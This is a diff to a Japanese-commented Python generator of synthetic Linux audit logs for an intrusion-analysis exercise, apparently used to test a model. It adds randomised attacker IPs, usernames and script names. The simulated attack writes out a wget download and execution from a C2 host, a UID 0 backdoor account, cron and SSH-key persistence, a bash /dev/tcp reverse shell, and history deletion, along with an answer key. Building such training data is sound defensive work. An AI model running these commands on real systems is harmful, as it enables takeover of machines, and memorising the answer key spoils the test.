@@ -42,6 +42,8 @@ UNSET = 4294967295  # auid / ses が未設定のときの値
 ATTACKER_IP = "203.0.113.45"
 C2_IP, C2_PORT = "198.51.100.23", 4444
 VICTIM = ("backup", 1003)
+BACKDOOR_USER = "sysupd"   # 攻撃者が追加する UID 0 の利用者
+SCRIPT = "upd.sh"           # 攻撃者がダウンロードするスクリプト
 USERS = {"tanaka": 1001, "suzuki": 1002, "deploy": 1004}
 BADUSERS = ["admin", "test", "oracle", "ubuntu", "pi", "guest", "postgres"]
 SERVICES = ["logrotate", "apt-daily", "man-db", "fstrim", "systemd-tmpfiles-clean", "motd-news"]
@@ -280,24 +282,24 @@ def incident(L: Log, ses_box: list, brute: int = 23):
         L.execve(argv, uid, uid, ses, tty, cwd, shell)
     # 4. sudo でダウンロード・実行
     L.tick(5, 15)
-    sudo_cmd(L, name, uid, ses, tty, cwd, ["wget", "-q", f"http://{C2_IP}/upd.sh", "-O", "/tmp/.upd.sh"], shell,
+    sudo_cmd(L, name, uid, ses, tty, cwd, ["wget", "-q", f"http://{C2_IP}/{SCRIPT}", "-O", f"/tmp/.{SCRIPT}"], shell,
              mark="download")
     L.tick(2, 6)
-    sudo_cmd(L, name, uid, ses, tty, cwd, ["chmod", "+x", "/tmp/.upd.sh"], shell)
+    sudo_cmd(L, name, uid, ses, tty, cwd, ["chmod", "+x", f"/tmp/.{SCRIPT}"], shell)
     L.tick(1, 3)
-    sudo_cmd(L, name, uid, ses, tty, cwd, ["bash", "/tmp/.upd.sh"], shell, mark="exec_payload")
+    sudo_cmd(L, name, uid, ses, tty, cwd, ["bash", f"/tmp/.{SCRIPT}"], shell, mark="exec_payload")
     sh = L.rng.randint(2000, 65000)
     # 5. スクリプトの中身：UID 0 の利用者追加・cron・SSH 鍵・外部への接続
     L.tick(0.2, 1)
-    L.execve(["useradd", "-o", "-u", "0", "-g", "0", "-M", "-d", "/root", "-s", "/bin/bash", "sysupd"],
+    L.execve(["useradd", "-o", "-u", "0", "-g", "0", "-M", "-d", "/root", "-s", "/bin/bash", BACKDOOR_USER],
              0, uid, ses, tty, "/tmp", sh, gid=0)
     L.event([L.user_msg("ADD_USER", L.rng.randint(2000, 65000), 0, uid, ses,
-                        f'op=add-user acct="sysupd" exe="/usr/sbin/useradd" hostname={HOST} addr=? terminal=pts/1 res=success')],
+                        f'op=add-user acct="{BACKDOOR_USER}" exe="/usr/sbin/useradd" hostname={HOST} addr=? terminal=pts/1 res=success')],
             mark="add_user")
     L.file_write("/etc/passwd", "openat", 0, uid, ses, tty, "useradd", "/usr/sbin/useradd", "identity", sh)
     L.file_write("/etc/shadow", "openat", 0, uid, ses, tty, "useradd", "/usr/sbin/useradd", "identity", sh)
     L.tick(0.3, 1)
-    L.file_write("/etc/cron.d/sysupd", "openat", 0, uid, ses, tty, "bash", "/usr/bin/bash", "cron", sh,
+    L.file_write(f"/etc/cron.d/{BACKDOOR_USER}", "openat", 0, uid, ses, tty, "bash", "/usr/bin/bash", "cron", sh,
                  create=True, mark="cron")
     L.tick(0.3, 1)
     L.file_write("/root/.ssh/authorized_keys", "openat", 0, uid, ses, tty, "bash", "/usr/bin/bash", "rootkey", sh,
@@ -308,7 +310,7 @@ def incident(L: Log, ses_box: list, brute: int = 23):
                     f"items=0 ppid={sh} pid={L.rng.randint(2000, 65000)} auid={uid} uid=0 gid=0 euid=0 suid=0 fsuid=0 "
                     f'egid=0 sgid=0 fsgid=0 tty={tty} ses={ses} comm="bash" exe="/usr/bin/bash" subj=unconfined key="network_connect"'),
         ("SOCKADDR", "saddr=" + saddr_v4(C2_IP, C2_PORT)),
-        ("PROCTITLE", "proctitle=" + "00".join(hexs(x) for x in ["bash", "-c", "bash -i >& /dev/tcp/198.51.100.23/4444 0>&1"])),
+        ("PROCTITLE", "proctitle=" + "00".join(hexs(x) for x in ["bash", "-c", f"bash -i >& /dev/tcp/{C2_IP}/{C2_PORT} 0>&1"])),
     ], mark="c2_connect")
     # 6. 痕跡の消去
     L.tick(20, 60)
@@ -387,7 +389,20 @@ def main() -> None:
     ap.add_argument("--brute", type=int, default=23, help="攻撃者の総当たりの失敗回数（既定 23）")
     ap.add_argument("--target-tokens", type=int, help="ログ全体がこのトークン数以下になるよう、平常の出来事の数を減らす")
     ap.add_argument("--url", help="llama-server の URL。指定すると /tokenize で正確に数える（なければ文字数から推定）")
+    ap.add_argument("--vary", action="store_true",
+                    help="攻撃元 IP・接続先 IP とポート・アカウント名・追加される利用者名・スクリプト名を seed に応じて変える"
+                         "（複数のログで精度を測るとき用。付けなければ従来と同じ固定値）")
     a = ap.parse_args()
+
+    if a.vary:
+        global ATTACKER_IP, C2_IP, C2_PORT, VICTIM, BACKDOOR_USER, SCRIPT
+        v = random.Random(a.seed * 7919 + 1)  # ログ本体の乱数とは別系列にする
+        ATTACKER_IP = f"203.0.113.{v.randint(2, 250)}"
+        C2_IP = f"198.51.100.{v.randint(2, 250)}"
+        C2_PORT = v.choice([4444, 1337, 8443, 9001, 31337, 5555, 6667, 53])
+        VICTIM = (v.choice(["backup", "ops", "jenkins", "report", "nagios"]), 1003)
+        BACKDOOR_USER = v.choice(["sysupd", "svcmon", "dbmaint", "logsync", "kworkerd"])
+        SCRIPT = v.choice(["upd.sh", "fix.sh", "run.sh", "sync.sh", "init.sh"])
 
     count = lambda text: count_tokens(text, a.url)
     events = a.events
@@ -420,25 +435,26 @@ def main() -> None:
                             "attempts_backup": n_backup},
             "actions": [
                 {"step": "偵察", "detail": "id / uname -a / cat /etc/passwd"},
-                {"step": "ダウンロード", "detail": f"sudo wget -q http://{C2_IP}/upd.sh -O /tmp/.upd.sh", **m["download"]},
-                {"step": "実行権限付与", "detail": "sudo chmod +x /tmp/.upd.sh"},
-                {"step": "実行", "detail": "sudo bash /tmp/.upd.sh", **m["exec_payload"]},
-                {"step": "持続化：UID 0 の利用者追加", "detail": "useradd -o -u 0 -g 0 ... sysupd（ADD_USER と /etc/passwd・/etc/shadow への書き込み）", **m["add_user"]},
-                {"step": "持続化：cron", "detail": "/etc/cron.d/sysupd を新規作成（key=cron）", **m["cron"]},
+                {"step": "ダウンロード", "detail": f"sudo wget -q http://{C2_IP}/{SCRIPT} -O /tmp/.{SCRIPT}", **m["download"]},
+                {"step": "実行権限付与", "detail": f"sudo chmod +x /tmp/.{SCRIPT}"},
+                {"step": "実行", "detail": f"sudo bash /tmp/.{SCRIPT}", **m["exec_payload"]},
+                {"step": "持続化：UID 0 の利用者追加", "detail": f"useradd -o -u 0 -g 0 ... {BACKDOOR_USER}（ADD_USER と /etc/passwd・/etc/shadow への書き込み）", **m["add_user"]},
+                {"step": "持続化：cron", "detail": f"/etc/cron.d/{BACKDOOR_USER} を新規作成（key=cron）", **m["cron"]},
                 {"step": "持続化：SSH 鍵", "detail": "/root/.ssh/authorized_keys に書き込み（key=rootkey）", **m["authorized_keys"]},
                 {"step": "外部への通信（リバースシェル）", "detail": f"connect → {C2_IP}:{C2_PORT}（SOCKADDR）", **m["c2_connect"]},
                 {"step": "痕跡の消去", "detail": f"/home/{VICTIM[0]}/.bash_history を削除（key=delete）", **m["history_delete"]},
                 {"step": "ログアウト", **m["logout"]},
             ],
             "c2": {"ip": C2_IP, "port": C2_PORT, "saddr": saddr_v4(C2_IP, C2_PORT)},
-            "persistence": ["UID 0 の利用者 sysupd", "/etc/cron.d/sysupd", "/root/.ssh/authorized_keys"],
+            "persistence": [f"UID 0 の利用者 {BACKDOOR_USER}", f"/etc/cron.d/{BACKDOOR_USER}", "/root/.ssh/authorized_keys"],
+            "backdoor_user": BACKDOOR_USER, "script": SCRIPT,
             "distractors": [
                 "192.0.2.0/24 からの無効な利用者名での失敗ログイン（無差別な総当たり。侵入には至っていない）",
                 "deploy の sudo systemctl reload nginx（正規の運用）",
                 "tanaka の passwd（USER_CHAUTHTOK。自分のパスワード変更で正常）",
             ],
             "key_points": [
-                "sudo で root になっても auid=1003（backup）のまま。誰の操作かは auid で追う",
+                f"sudo で root になっても auid=1003（{VICTIM[0]}）のまま。誰の操作かは auid で追う",
                 "USER_CMD の cmd と PROCTITLE は16進数。解読するとコマンドがわかる",
                 "SOCKADDR の saddr: 0200=AF_INET、次の4桁がポート、次の8桁が IPv4 アドレス",
             ],
